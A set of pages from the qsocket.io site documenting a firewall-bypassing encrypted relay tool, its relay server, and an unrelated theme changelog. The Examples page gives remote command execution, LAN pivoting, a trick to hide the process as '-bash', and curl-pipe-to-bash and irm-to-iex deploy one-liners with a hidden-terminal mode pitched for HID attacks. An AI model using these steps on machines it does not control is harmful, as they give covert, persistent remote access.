[{"content":" Quantum Socket allows end-to-end (E2E) encrypted peer-to-peer (P2P) communication through firewalls and NAT 🎉\nThe qsocket library locally derives a universally unique identifier (UUID) and connects two devices through the Quantum Socket Relay Network (QSRN) regardless and independent of the network layers, local IP Address or geographical location. The entire qsocket project is ported from the original gsocket toolkit of THC.\nBut Why? So why did you reinvent the wheel? Simply because we wanted our own wheel :) Due to several design choices of THC and the nature of the project we were not comfortable using the GSRN for our own business. So we decided to create our own version to our own liking. We also wanted to modernize the project by porting it to Go/Rust, add new features, more platform support, new features, and scalability.\nSupported Platforms QSocket toolkit supports 12 platforms on 11 architecture, check Supported Platforms below for detailed table.\nSupported Platforms ✅ Supported 🚧 In progress ❌ Unsupported ARCH/OS Linux MacOS Windows Android IOS FreeBSD OpenBSD NetBSD Solaris Illumos Dragonfly AIX AMD64 ✅ ✅ ✅ ✅ 🚧 ✅ ✅ ✅ ✅ ✅ ✅ ❌ ARM64 ✅ ✅ ✅ ✅ 🚧 ✅ ✅ ❌ ❌ ❌ ❌ ❌ 386 ✅ ❌ ✅ ✅ ❌ ✅ ✅ ✅ ❌ ❌ ❌ ❌ ARM32 ✅ ❌ ✅ ✅ ❌ ✅ ✅ ✅ ❌ ❌ ❌ ❌ RISCV64 🚧 ❌ ❌ ❌ ❌ 🚧 ❌ ❌ ❌ ❌ ❌ ❌ MIPS64 ✅ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ MIPS32 ✅ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ MIPSLE ✅ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ PPC64 ✅ ❌ ❌ ❌ ❌ ❌ 🚧 ❌ ❌ ❌ ❌ 🚧 PPC64LE ✅ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ S390X ✅ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ ❌ Crypto / Security Mumble Jumble\nThe connections are end-2-end encrypted. This means from User-2-User (and not just to the Relay Network). The Relay Network relays only (encrypted) data to and from the Users. The QSocket uses SRP for ensuring perfect forward secrecy. This means that the session keys are always different, and recorded session traffic cannot be decrypted by the third parties even if the user secret is known. The session key is 256 bit and ephemeral. It is freshly generated for every session and generated randomly (and is not based on the password). A brute force attack against weak secrets requires a new TCP connection for every guess. But QSRN contains a strong load balancer which is limiting the consecutive connection attempts. Do not use stupid passwords like \u0026lsquo;password123\u0026rsquo;. Malice might pick the same (stupid) password by chance and connect. If in doubt use qs-netcat -g to generate a strong one. Alice\u0026rsquo;s and Bob\u0026rsquo;s password should at least be strong enough so that Malice can not guess it by chance while Alice is waiting for Bob to connect. If Alice shares the same password with Bob and Charlie and either one of them connects then Alice can not tell if it is Bob or Charlie who connected. Assume Alice shares the same password with Bob and Malice. When Alice stops listening for a connection then Malice could start to listen for the connection instead. Bob (when opening a new connection) can not tell if he is connecting to Alice or to Malice. We did not invent SRP. It\u0026rsquo;s a well-known protocol, and it is well-analyzed and trusted by the community. ","permalink":"https://www.qsocket.io/about/","title":"About"},{"content":" Changelog v1.0.1 (2022/04/02) Fixed Fix img style issue, it should be max-width instead of width (#10) v1.0.0 - First Major Release (2022/04/01) Added Layout New Layout: Postcard Layout, Blank Layout Support pagination for Postcard Layout and List Layout Enhance list layout date format. If current list layout is grouped by year, hide list item\u0026rsquo;s year. Redesign default home page layout using Postcard Layout Add sidebar for better navbar responsiveness on small screen New Shortcode emgithub: directly embed github source code like gist with Prism.js syntax highlighting External Library Optimize Prism.js integration Add smooth transition to prevent line number jittering while page rendering Integrate Prism.js autoloader to prevent huge bundle file Optimize Zooming.js integration Background color is now dynamically changed based on current theme Fuse.js integration Support highlight matched text in search menu New Theme Parameters list_layout.enable_group_by_year list_layout.enable_show_date list_layout.enable_pagination syntax_highlight.lib syntax_highlight.builtin.enable_code_copy syntax_highlight.prism.enable_code_copy syntax_highlight.prism.enable_line_no New Page Parameters search_hidden: hide page from search index pagination: control pagination for List Layout Changed Change RSS content from full post to summary for smaller resource purpose Change all icons to feathericons Site search engine has been changed from flexsearch to fuse.js for better CJK language supports Parameter name has all been changed to snake_case for consistency Syntax highlight settings are now grouped by syntax_highlight svg-wrapper shortcode has been changed to icon Removed All javascript package dependencies are removed, Monochrome is now self-contained without the help of npm and become extremely easy to setup and modify. Remove list_posts property from list layout, this functionality has been replaced by Blank Layout v0.9.2 (2022/02/25) Fix: reimplement terms-cloud to prevent size overflow (max size: 1.6 rem) v0.9.1 (2022/02/25) Change: set terms-cloud max font size to 1.4 rem Fix: site search url from absLangURL to relLangURL v0.9.0 (2022/01/31) Improve: search implementation hide the mismatch objects instead of removing it while searching widen the control range of search result Improve: gallery layout\u0026rsquo;s key and value now support markdown syntax Improve: Zooming.js configuration speed up animations setup transparent background Change: for consistency, the names of the following parameters are changed: page\u0026rsquo;s collapsibleTOC =\u0026gt; collapsible_toc page\u0026rsquo;s collapsibleChangelogs =\u0026gt; collapsible_changelogs Change: font-size of html is changed from 18px to 16px Add: breadcrumbs shortcode Add: list layout properties group_by_year and show_date Fix: terms-cloud typo (#4) v0.8.0 (2021/07/29) Improve: flexsearch multilingual search capability Improve: widen the control range of navbar menu items Change: flexsearch can now search index pages Change: the post content in RSS is changed from summary to full text Add: collapsible TOC and Changelogs v0.7.1 (2021/07/08) Change: adjust the style of changelogs Fix: flexsearch search API issue v0.7.0 (2021/06/24) Bump dependencies version Add: changelogs property Add: support disqus for index page (turn off by default) Change: theme name from \u0026lsquo;Graytr\u0026rsquo; to \u0026lsquo;Monochrome\u0026rsquo; Change: improve navbar responsiveness Fix: widen the control range of navbar menu icon v0.6.2 (2021/04/15) Fix: google search console authentication failed if ga code not in \u0026lt;head\u0026gt; Fix: clipboard-polyfill/text dependency resolved issue v0.6.1 (2021/02/17) Fix: codepen shortcode id Change baseurl to example.com in exampleSite v0.6.0 (2021/02/16) Support MathJax Add shortcodes: jsfiddle, codepen, color-block, icon-group, terms-cloud Add option: list_posts in list layout Fix: not register touchend event v0.5.0 (2021/02/15) Support multilingual mode Add i18n Support Open Graph, Twitter Card Adjust svg-wrapper shortcode Add some social icons: facebook, github, twitter, rss, mail Support site search (powered by flexsearch) Disable unused features in tailwindcss (speedup building time) Reorganize parameters Remove default image to figure transformation, using built-in shortcode instead v0.4.0 (2021/02/12) Support dark mode Add bookcase_cover_src_dark for bookcase layout Add balloon_img_src_dark for balloon layout Add shortcode: svg-wrapper Prism.js integration (v1.23.0) Code copy feature for code block v0.3.0 (2021/02/10) Support nested navbar Implement default homepage layout Adjust the purpose of bookcase layout Remove catalog layout v0.2.0 (2021/02/09) A better responsive navbar Implement default taxonomy and term layout Adjust article styles v0.1.0 (2021/02/08) Initial release.\n","permalink":"https://www.qsocket.io/changelog/","title":"Changelog"},{"content":" Usage Examples RDP connection over QSRN ADB access over QSRN Usage:\nLog in to Workstation A from Workstation B through any firewall/NAT qs-netcat -l -i # Workstation A qs-netcat -i # Workstation B SSH from Workstation A to Workstation B by port forwarding through any firewall/NAT qs-netcat -l # Workstation B qs-netcat -f \u0026quot;22:localhost:22\u0026quot; # Workstation A ssh user@localhost # Workstation A Transfer files from Workstation B to Workstation A using smart pipes qs-netcat -s MySecret -l \u0026gt; file.txt # Workstation A qs-netcat -s MySecret \u0026lt; file.txt # Workstation B Port forward. Access 192.168.6.7:80 on Workstation A\u0026rsquo;s private LAN from Workstation B: qs-netcat -l # Workstation A qs-netcat -f 192.168.6.7:80 # Workstation B Execute any command (nc -e style) on Workstation A qs-netcat -l # Workstation A qs-netcat -e \u0026quot;echo hello_world; id\u0026quot; # Workstation B Access entirety of Workstation A\u0026rsquo;s private LAN (Sock4/4a/5 proxy) qs-netcat -l # Workstation A qs-netcat -f \u0026quot;22:localhost:22\u0026quot; # Workstation B ssh -D 9090 root@localhost # Workstation B # Access www.google.com via Workstation A's private LAN from your Workstation B: curl --socks4a 127.1:9090 http://www.google.com Mount a remote folder of Workstation A using sshfs and qs-netcat qs-netcat -l # Workstation A qs-netcat -f \u0026quot;22:localhost:22\u0026quot; # Workstation B sudo sshfs -o allow_other,default_permissions root@localhost:/remote_dir /mnt/local_dir # Workstation B Pro Tips\nHide your arguments (argv) Pass the arguments by environment variable (QS_ARGS) and use a bash-trick to hide qs-netcat binary in the process list:\nexport QS_ARGS=\u0026quot;-s MySecret -l -i -q\u0026quot; exec -a -bash ./qs-netcat \u0026amp; # Hide as '-bash'. ps alxww | grep qs-netcat ps alxww | grep -bash # 1001 47255 1 0 26 5 4281168 436 - SNs ?? 0:00.00 -bash Deploy Examples Deploy with a spesific secret value S=\u0026quot;MySecret\u0026quot; curl -fsSL qsocket.io/0 | bash # For *nix $Env:S=\u0026quot;MySecret\u0026quot;; irm qsocket.io/1 | iex # For Windows Hide Terminal During Deploymeny This option can be usefull during HID attacks.\nHIDE=1 curl -fsSL qsocket.io/0 | bash # For \\*nix $Env:HIDE=1; irm qsocket.io/1 | iex # For Windows ","permalink":"https://www.qsocket.io/examples/","title":"Examples"},{"content":" The relay server is the back bone of the QSocket project. It is designed for relaying the incoming QSocket connections with high performance and scalability. The official relay instance for the QSocket project gate.qsocket.io is available for public use totally free of charge. But we advise everyone to setup their own relays on their own infrastructure.\nBenchmarks A single qsr instance with a 2GB RAM and 1 CPU cores can handle between 30.000/45.000 simultaneous relay connections.\nInstallation The qsocket-relay is still in beta stage. The source code will be available with the first major release. It will be directly deployable with heroku, google cloud, and aws.\nTool Build From Source Docker Image Binary Release qsr go install github.com/qsocket/qsocket-relay@latest Download Download Usage ________________________________ / IN \u0026gt; \u0026quot;-_ / . | . ヽ༼ຈل͜ຈ༽))\u0026gt;=- \\ ༼つಠ益ಠ༽つ ─=≡ΣO)) _ _ / : \\ | / : \\ __ _ ___ ___ ___| | _____| |_ / '-___-' ☜(❍ᴥ❍ʋ))\u0026gt;- \\ / _` / __|/ _ \\ / __| |/ / _ \\ __| /_________________________________________ \\ | (_| \\__ \\ (_) | (__| \u0026lt; __/ |_ _______| |________________________--\u0026quot;\u0026quot;-L \\__, |___/\\___/ \\___|_|\\_\\___|\\__| / F J \\ |_| Copyright (c) 2022 Qsocket / F J L https://github.com/qsocket/ / :' ': ─=≡Σ((( つ◕ل͜◕)つ F / OUT \u0026lt; '-___-' / /_________________________________________--\u0026quot; Usage: qsr Flags: -h, --help Show context-sensitive help. -c, --config=STRING Config file in TOML format. -d, --logdir=STRING Log directory. -t, --threads=5 Number of threads. -q, --quiet Quiet mode. (no stdout) -v, --verbose Verbose mode. --version QSocket Protocol QSocket connections are initiated with a knock sequence. Knock sequence is 20 bytes long and contains 128bit unique identifier, 1 byte checksum, and 3 byte peer identifier. After establishing a valid TLS connection, relay server expects a knock sequence for starting the QSocket session.\nWhen the relay server receives a valid knock sequence it first checks the master relay table for the UID of the connecting peer, if the UID does not exists, it is added to the table and the client starts waiting a period of time for incoming relay requests from other peers. If there is a relay request waiting for the client key (UID), relay server creates a full duplex connection between two sockets.\n","permalink":"https://www.qsocket.io/qsrn/","title":"QSocket Relay Network"}]